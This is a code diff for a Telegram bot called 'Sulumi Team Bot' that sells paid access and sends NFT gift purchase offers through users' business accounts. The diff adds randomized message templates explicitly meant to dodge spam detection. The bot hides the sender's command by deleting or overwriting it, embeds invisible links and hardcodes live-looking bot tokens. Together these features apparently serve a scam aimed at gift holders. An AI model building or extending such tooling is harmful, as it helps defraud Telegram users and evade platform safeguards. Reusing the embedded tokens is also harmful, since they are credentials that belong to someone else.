@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Final Full Code (No Spam, Fixed End)
+Sulumi Team Bot — New Bot Credentials
 """
 
 import os
@@ -10,13 +10,15 @@ import sqlite3
 import requests
 from collections import deque
 from flask import Flask, request, jsonify
+import random
 
 app = Flask(__name__)
 
 # ==================== КОНФИГ ====================
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "9021246143:AAF0SsyX81BAHC-myqxc2vN00JcFPGpgKhk")
-OWNER_ID = int(os.environ.get("OWNER_ID", "7092015279"))
-PAYMENT = os.environ.get("PAYMENT", "golda11123")
+# ОБНОВЛЕННЫЕ КРЕДЫ
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
+OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
+PAYMENT = os.environ.get("PAYMENT", "golda11123") # Поменяй, если нужно
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://sulumi-bot.onrender.com")
 
@@ -185,11 +187,18 @@ def pnft(t):
     gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
     return {"slug": s, "name": gn, "num": num, "nfmt": fmt(num)}
 
+# ==================== РАНДОМИЗАЦИЯ ТЕКСТА (АНТИ-СПАМ) ====================
+def get_random_offer_text(sender_name, pr, cs, ni_name, ni_nfmt):
+    templates = [
+        f"Привет! 👋 <b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за твой подарок <b>{ni_name} #{ni_nfmt}</b>.",
+        f"Салют! <b>{sender_name}</b> готов забрать <b>{ni_name} #{ni_nfmt}</b> за <b>{pr}</b> {cs}. Интересно?",
+        f"Здарова! Даю <b>{pr}</b> {cs} за <b>{ni_name} #{ni_nfmt}</b> от <b>{sender_name}</b>. Жду решения."
+    ]
+    return random.choice(templates) + "\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
+
 # ==================== ОБРАБОТКА СООБЩЕНИЙ ====================
 def process_msg(msg):
     try:
-        print(f"=== MSG ===")
-        
         chat = msg.get("chat", {})
         from_user = msg.get("from", {})
         cid = chat.get("id")
@@ -197,22 +206,16 @@ def process_msg(msg):
         mid = msg.get("message_id")
         ci = msg.get("business_connection_id")
         
-        print(f"cid={cid}, uid={uid}, mid={mid}, ci={ci}")
-        
         if not cid or not uid:
-            print("SKIP: no cid or uid")
             return
         
         if ci:
             bconns[uid] = ci
-            print(f"Saved bci for {uid}: {ci}")
         
         txt = msg.get("text") or ""
         txt = txt.strip()
-        print(f"Text: '{txt}'")
         
         if not txt:
-            print("SKIP: empty text")
             return
         
         if uid in wholder:
@@ -245,11 +248,8 @@ def process_msg(msg):
                 sm(cid, "❌ Напиши stars или grams", bci=ci)
             return
         
-        # ИГНОРИРУЕМ обычные сообщения (БОЛЬШЕ НЕ СПАМИМ)
         if not txt.startswith("/"):
             return
-        
-        print(f"Command: {txt}")
         
         public_cmds = ["/start", "/tarifs", "/help"]
         if txt not in public_cmds and uid != OWNER_ID and not is_allowed(uid):
@@ -269,7 +269,6 @@ def process_msg(msg):
             if uid == OWNER_ID:
                 t += "\n\n🔐 <b>Админ:</b>\n/add <id> <дни> (-1 навсегда)\n/list — Список доступов"
             sm(cid, t, bci=ci)
-            print("Handled /start")
             return
         
         if txt == "/tarifs":
@@ -279,12 +278,10 @@ def process_msg(msg):
             t += "🥇 <b>Навсегда</b> — 4.5 TON\n\n"
             t += f"💳 Для оплаты: отправьте TON и напишите @{PAYMENT} с чеком."
             sm(cid, t, bci=ci)
-            print("Handled /tarifs")
             return
         
         if txt == "/help":
             sm(cid, "❓ <b>Помощь</b>\n\nЗайди в ЛС к продавцу и напиши:\n<code>/send ссылка цена</code>", bci=ci)
-            print("Handled /help")
             return
         
         if txt == "/profile":
@@ -296,7 +293,6 @@ def process_msg(msg):
             t += f"👑 Держатель: @{s['hold']}\n"
             t += f"⏳ Доступ до: <b>{get_expires_str(uid)}</b>"
             sm(cid, t, bci=ci)
-            print("Handled /profile")
             return
         
         if txt == "/settings":
@@ -312,29 +308,24 @@ def process_msg(msg):
             t += "/cv — сменить валюту\n"
             t += "/holder <username> — сменить держателя"
             sm(cid, t, bci=ci)
-            print("Handled /settings")
             return
         
         if txt == "/lg":
             wlang.add(uid)
             sm(cid, "🌐 Напиши <b>ru</b> или <b>en</b>", bci=ci)
-            print("Handled /lg")
             return
         
         if txt == "/cv":
             wcur.add(uid)
             sm(cid, "💱 Напиши <b>stars</b> или <b>grams</b>", bci=ci)
-            print("Handled /cv")
             return
         
         if txt.startswith("/holder"):
             wholder.add(uid)
             sm(cid, "👑 Напишите username держателя БЕЗ @", bci=ci)
-            print("Handled /holder")
             return
         
         if txt.startswith("/send"):
-            print("Processing /send...")
             parts = txt.split()
             if len(parts) < 3:
                 sm(cid, "❌ <b>Формат:</b>\n<code>/send ссылка цена</code>", bci=ci)
@@ -361,7 +352,6 @@ def process_msg(msg):
             did = str(uuid.uuid4())[:8]
             
             sender_bci = ci or bconns.get(uid)
-            print(f"sender_bci: {sender_bci}")
             
             if not sender_bci:
                 sm(cid, "⚠️ Подключи бизнес-аккаунт! @BotFather → Business → Connect", bci=ci)
@@ -376,24 +366,19 @@ def process_msg(msg):
             nl = "https://t.me/nft/" + ni["slug"]
             hidden = '<a href="' + nl + '">\u200b</a>'
             sender_name = from_user.get('first_name') or from_user.get('username') or "Пользователь"
-            caption = hidden + f"<b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
             
-            print(f"Sending offer to chat {cid}...")
+            # ИСПОЛЬЗУЕМ РАНДОМНЫЙ ШАБЛОН ДЛЯ АНТИ-СПАМА
+            caption = hidden + get_random_offer_text(sender_name, pr, cs, ni['name'], ni['nfmt'])
+            
             result = sm_nft(cid, caption, nl, kb=okb(did), bci=sender_bci)
-            print(f"Send result: {result.get('ok')} - {result.get('description', '')}")
             
             if result.get("ok"):
                 if mid:
                     del1 = dm(cid, mid, bci=sender_bci)
-                    print(f"Delete attempt 1 (with bci): {del1.get('ok')} - {del1.get('description', '')}")
-                    
                     if not del1.get("ok"):
                         del2 = dm(cid, mid)
-                        print(f"Delete attempt 2 (without bci): {del2.get('ok')} - {del2.get('description', '')}")
-                    
-                    if not del1.get("ok") and not del2.get("ok"):
-                        em(cid, mid, "ok", bci=sender_bci)
-                        print("Delete attempt 3: edited message to ok")
+                        if not del1.get("ok") and not del2.get("ok"):
+                            em(cid, mid, "ok", bci=sender_bci)
             else:
                 sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
             return
@@ -424,8 +409,6 @@ def process_msg(msg):
         
     except Exception as e:
         print(f"!!! CRITICAL ERROR in process_msg: {e}")
-        import traceback
-        traceback.print_exc()
 
 # ==================== ОБРАБОТКА CALLBACK ====================
 def process_cb(cb):
@@ -437,8 +420,6 @@ def process_cb(cb):
         mid = msg.get("message_id", 0)
         data = cb.get("data", "")
         ci = msg.get("business_connection_id")
-        
-        print(f"=== CB === data={data} uid={uid}")
         
         if data.startswith("check:"):
             did = data.split(":")[1]
@@ -493,15 +474,12 @@ def process_cb(cb):
         
     except Exception as e:
         print(f"!!! CB ERROR: {e}")
-        import traceback
-        traceback.print_exc()
 
 # ==================== WEBHOOK ====================
 @app.route("/webhook", methods=["POST"])
 def webhook():
     try:
         update = request.json
-        print(f"=== UPDATE === keys: {list(update.keys()) if update else 'None'}")
         
         if "message" in update:
             process_msg(update["message"])
@@ -512,13 +490,8 @@ def webhook():
         elif "business_connection" in update:
             bc = update["business_connection"]
             bconns[bc["user"]["id"]] = bc["id"]
-            print(f"Business connection: {bc['user']['id']} -> {bc['id']}")
-        else:
-            print(f"Unknown update type: {list(update.keys())}")
     except Exception as e:
         print(f"!!! WEBHOOK ERROR: {e}")
-        import traceback
-        traceback.print_exc()
     return jsonify({"ok": True})
 
 @app.route("/")
@@ -532,7 +505,7 @@ def set_webhook():
 
 def set_commands():
     commands = [
-        {"command": "start", "description": "📋 Меню"},
+        {"command": "start", "description": "📋 Меню и все команды"},
         {"command": "send", "description": "💎 Создать оффер"},
         {"command": "tarifs", "description": "💳 Цены"},
         {"command": "profile", "description": "👤 Профиль"},
